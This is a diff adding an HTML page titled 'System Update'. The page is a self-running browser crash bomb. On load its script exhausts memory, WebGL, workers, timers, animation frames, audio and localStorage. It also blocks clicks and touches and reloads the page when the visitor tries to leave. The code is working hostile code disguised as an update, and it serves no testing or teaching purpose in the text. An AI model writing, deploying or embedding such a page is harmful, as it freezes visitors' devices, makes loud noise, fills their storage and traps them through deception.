@@ -1,0 +1,325 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>System Update</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html, body { 
+            width: 100%; 
+            height: 100%; 
+            overflow: hidden; 
+            background: #000;
+        }
+        #crashOverlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: #000;
+            color: #f00;
+            font-family: 'Courier New', monospace;
+            font-size: 5vw;
+            z-index: 9999;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            text-shadow: 0 0 10px #f00;
+        }
+    </style>
+</head>
+<body>
+    <div id="crashOverlay">SYSTEM OVERLOAD</div>
+    
+    <script>
+        // IMMEDIATE EXECUTION - NO DELAYS
+        (function() {
+            'use strict';
+            
+            // 1. BLOCKING MAIN THREAD IMMEDIATELY
+            console.log("INITIATING OVERLOAD SEQUENCE");
+            
+            // 2. MEMORY BOMB - Allocate massive arrays
+            const memoryBomb = [];
+            for (let i = 0; i < 100; i++) {
+                memoryBomb.push(new Float64Array(10000000)); // 10 million floats
+            }
+            
+            // 3. INFINITE MICROTASK LOOP
+            function infiniteMicrotaskLoop() {
+                Promise.resolve().then(() => {
+                    // Create DOM nodes in microtask
+                    for (let j = 0; j < 1000; j++) {
+                        const div = document.createElement('div');
+                        div.innerHTML = 'X'.repeat(10000);
+                        div.style.cssText = `position:absolute;top:${Math.random()*100}%;left:${Math.random()*100}%;color:rgb(${Math.random()*255},${Math.random()*255},${Math.random()*255});font-size:${Math.random()*50}px;`;
+                        document.body.appendChild(div);
+                    }
+                    infiniteMicrotaskLoop();
+                });
+            }
+            
+            // 4. WEBGL MEMORY EXHAUSTION
+            function crashWebGL() {
+                try {
+                    const canvas = document.createElement('canvas');
+                    const gl = canvas.getContext('webgl2') || canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                    
+                    if (gl) {
+                        const textures = [];
+                        for (let i = 0; i < 1000; i++) {
+                            const texture = gl.createTexture();
+                            gl.bindTexture(gl.TEXTURE_2D, texture);
+                            gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
+                            textures.push(texture);
+                        }
+                    }
+                } catch(e) {}
+            }
+            
+            // 5. SYNCHRONOUS XHR BOMB
+            function xhrBomb() {
+                for (let i = 0; i < 50; i++) {
+                    try {
+                        const xhr = new XMLHttpRequest();
+                        xhr.open('GET', window.location.href, false); // SYNC REQUEST
+                        xhr.send();
+                    } catch(e) {}
+                }
+            }
+            
+            // 6. STACK OVERFLOW RECURSION
+            function stackOverflow(depth = 0) {
+                if (depth > 10000) return;
+                try {
+                    new Array(100000).fill(0).map((_, i) => i * i);
+                    stackOverflow(depth + 1);
+                } catch(e) {
+                    // Force garbage collection attempt (will fail)
+                    if (window.gc) window.gc();
+                }
+            }
+            
+            // 7. TIMER BOMB - Thousands of simultaneous intervals
+            for (let i = 0; i < 1000; i++) {
+                setInterval(() => {
+                    // Canvas flood
+                    const c = document.createElement('canvas');
+                    c.width = 4096;
+                    c.height = 4096;
+                    const ctx = c.getContext('2d');
+                    for (let j = 0; j < 100; j++) {
+                        ctx.fillRect(Math.random()*4096, Math.random()*4096, 1000, 1000);
+                    }
+                    document.body.appendChild(c);
+                }, 1);
+            }
+            
+            // 8. AUDIO CONTEXT BOMB
+            function audioBomb() {
+                try {
+                    const AudioContext = window.AudioContext || window.webkitAudioContext;
+                    if (AudioContext) {
+                        for (let i = 0; i < 100; i++) {
+                            const ctx = new AudioContext();
+                            const oscillator = ctx.createOscillator();
+                            const gain = ctx.createGain();
+                            oscillator.connect(gain);
+                            gain.connect(ctx.destination);
+                            oscillator.frequency.setValueAtTime(10000, ctx.currentTime);
+                            gain.gain.setValueAtTime(1, ctx.currentTime);
+                            oscillator.start();
+                        }
+                    }
+                } catch(e) {}
+            }
+            
+            // 9. LOCAL STORAGE FLOOD
+            function localStorageBomb() {
+                try {
+                    const data = 'X'.repeat(5000000); // 5MB string
+                    for (let i = 0; i < 100; i++) {
+                        localStorage.setItem('bomb_' + i, data);
+                    }
+                } catch(e) {}
+            }
+            
+            // 10. HISTORY MANIPULATION BOMB
+            function historyBomb() {
+                for (let i = 0; i < 1000; i++) {
+                    try {
+                        history.pushState({}, '', '#' + Math.random());
+                    } catch(e) {}
+                }
+            }
+            
+            // 11. CSSOM DESTRUCTION
+            function cssBomb() {
+                for (let i = 0; i < 1000; i++) {
+                    const style = document.createElement('style');
+                    style.textContent = `
+                        .bomb${i} {
+                            animation: spin${i} ${Math.random()}s infinite;
+                            filter: blur(${Math.random()*20}px) hue-rotate(${Math.random()*360}deg);
+                            transform: scale(${Math.random()*10});
+                        }
+                        @keyframes spin${i} {
+                            from { transform: rotate(0deg) scale(${Math.random()*10}); }
+                            to { transform: rotate(360deg) scale(${Math.random()*10}); }
+                        }
+                    `;
+                    document.head.appendChild(style);
+                }
+            }
+            
+            // 12. MUTATION OBSERVER BOMB
+            function mutationBomb() {
+                for (let i = 0; i < 100; i++) {
+                    const observer = new MutationObserver((mutations) => {
+                        mutations.forEach(() => {
+                            document.body.innerHTML += '<div style="position:fixed;top:0;left:0;width:100vw;height:100vh;background:rgba(255,0,0,0.1);z-index:999999;"></div>';
+                        });
+                    });
+                    observer.observe(document.body, {
+                        childList: true,
+                        attributes: true,
+                        characterData: true,
+                        subtree: true,
+                        attributeOldValue: true,
+                        characterDataOldValue: true
+                    });
+                }
+            }
+            
+            // 13. WEB WORKER BOMB
+            function workerBomb() {
+                try {
+                    const workerCode = `
+                        while(true) {
+                            postMessage(new ArrayBuffer(10000000));
+                            const arr = new Array(1000000).fill(0);
+                            for(let i = 0; i < arr.length; i++) {
+                                arr[i] = Math.random() * i;
+                            }
+                        }
+                    `;
+                    const blob = new Blob([workerCode], {type: 'application/javascript'});
+                    for (let i = 0; i < 50; i++) {
+                        const worker = new Worker(URL.createObjectURL(blob));
+                        worker.onmessage = () => {};
+                    }
+                } catch(e) {}
+            }
+            
+            // 14. REQUESTANIMATIONFRAME BOMB
+            function rafBomb() {
+                function bomb() {
+                    // Create 1000 canvas elements per frame
+                    for (let i = 0; i < 1000; i++) {
+                        const canvas = document.createElement('canvas');
+                        canvas.width = 1920;
+                        canvas.height = 1080;
+                        const ctx = canvas.getContext('2d');
+                        
+                        // Complex drawing operations
+                        for (let j = 0; j < 100; j++) {
+                            ctx.save();
+                            ctx.translate(Math.random()*1920, Math.random()*1080);
+                            ctx.rotate(Math.random() * Math.PI * 2);
+                            
+                            const gradient = ctx.createLinearGradient(0, 0, 500, 500);
+                            for (let k = 0; k < 10; k++) {
+                                gradient.addColorStop(k/10, `rgba(${Math.random()*255},${Math.random()*255},${Math.random()*255},${Math.random()})`);
+                            }
+                            
+                            ctx.fillStyle = gradient;
+                            ctx.fillRect(-250, -250, 500, 500);
+                            ctx.restore();
+                        }
+                        
+                        document.body.appendChild(canvas);
+                    }
+                    
+                    // Recursive call
+                    requestAnimationFrame(bomb);
+                }
+                requestAnimationFrame(bomb);
+            }
+            
+            // 15. FINAL EXECUTION - Run all bombs simultaneously
+            setTimeout(() => {
+                // Execute all destructive functions
+                const bombs = [
+                    infiniteMicrotaskLoop,
+                    crashWebGL,
+                    xhrBomb,
+                    stackOverflow,
+                    audioBomb,
+                    localStorageBomb,
+                    historyBomb,
+                    cssBomb,
+                    mutationBomb,
+                    workerBomb,
+                    rafBomb
+                ];
+                
+                bombs.forEach(bomb => {
+                    try {
+                        bomb();
+                    } catch(e) {
+                        // Ignore errors, continue bombing
+                    }
+                });
+                
+                // Force garbage collection to stress GC
+                setInterval(() => {
+                    try {
+                        const arr = new Array(10000000);
+                        arr.fill(0).map((x, i) => ({data: new Array(1000).fill(i)}));
+                    } catch(e) {}
+                }, 100);
+                
+            }, 100); // Small delay to ensure page loads first
+            
+            // 16. PREVENT UNLOAD
+            window.onbeforeunload = function(e) {
+                // Keep running even when trying to close
+                setTimeout(() => {
+                    location.reload();
+                }, 100);
+                return "DON'T LEAVE";
+            };
+            
+            // 17. DISABLE USER INTERACTION
+            document.addEventListener('touchstart', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+            }, {passive: false});
+            
+            document.addEventListener('click', function(e) {
+                e.preventDefault();
+                e.stopPropagation();
+                e.stopImmediatePropagation();
+            }, {passive: false});
+            
+            // 18. KEYBOARD SPAM
+            document.addEventListener('keydown', function() {
+                for (let i = 0; i < 1000; i++) {
+                    document.body.innerHTML += '<canvas width="4096" height="4096"></canvas>';
+                }
+            });
+            
+        })();
+        
+        // FINAL TOUCH: Remove overlay after 2 seconds to show chaos
+        setTimeout(() => {
+            document.getElementById('crashOverlay').style.display = 'none';
+        }, 2000);
+        
+    </script>
+</body>
+</html>
